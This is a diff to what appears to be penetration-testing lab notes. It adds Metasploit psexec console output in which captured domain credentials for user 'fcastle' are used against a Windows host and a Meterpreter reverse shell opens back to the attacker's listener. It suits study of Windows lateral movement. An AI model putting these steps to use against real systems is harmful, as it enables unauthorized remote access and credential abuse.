@@ -95,3 +95,18 @@ Exploit targets:
 
 It is better to choose `Native upload` for the targets if you have failed on `Automatic` 
 
+```shell
+msf6 exploit(windows/smb/psexec) > exploit
+
+[*] Started reverse TCP handler on 192.168.0.157:4444 
+[*] 192.168.0.166:445 - Connecting to the server...
+[*] 192.168.0.166:445 - Authenticating to 192.168.0.166:445|MARVEL.local as user 'fcastle'...
+[*] 192.168.0.166:445 - Selecting PowerShell target
+[*] 192.168.0.166:445 - Executing the payload...
+[+] 192.168.0.166:445 - Service start timed out, OK if running a command or non-service executable...
+[*] Sending stage (200774 bytes) to 192.168.0.166
+[*] Meterpreter session 1 opened (192.168.0.157:4444 -> 192.168.0.166:56193) at 2023-09-16 16:25:05 -0400
+
+meterpreter > 
+```
+
